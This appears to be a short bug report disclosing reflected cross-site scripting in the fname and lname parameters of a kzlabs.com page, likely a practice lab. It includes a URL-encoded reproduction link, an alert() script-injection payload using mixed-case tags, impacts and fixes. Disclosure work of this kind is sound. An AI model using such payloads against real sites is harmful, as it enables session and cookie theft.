## Title
Reflected Cross-Site Scripting (XSS) in `fname` and `lname` Parameters

## Summary
I identified a reflected Cross-Site Scripting (XSS) vulnerability in the `fname` and `lname` parameters of the following endpoint:

## Vulnerable Endpoint
`https://kzlabs.com/punishment/4.php`

## Steps to Reproduce
1. Open the following URL in a browser:
`https://kzlabs.com/punishment/4.php?fname=rajvardhan1%22%3E%3CScRipt%3Ealert%28%22RAJ%22%29%3C%2FScRipt%3E&lname=rajvardhan1%22%3E%3CScRipt%3Ealert%2810%29%3C%2FScRipt%3E`

2. Observe JavaScript execution in browser.

## Payload Used
`rajvardhan1"><ScRipt>alert("RAJ")</ScRipt>`

## Proof of Concept
## Screenshot — Vulnerable application confirming XSS execution
<img width="1909" height="745" alt="image" src="https://github.com/user-attachments/assets/ecb6b5c2-f9c0-4ef8-803e-49ea2291047f" />


## Impact
- Cookie theft
- Session hijacking
- JavaScript execution in browser

## Recommendations for Fix
- Use output encoding
- Validate input
- Avoid unsafe rendering
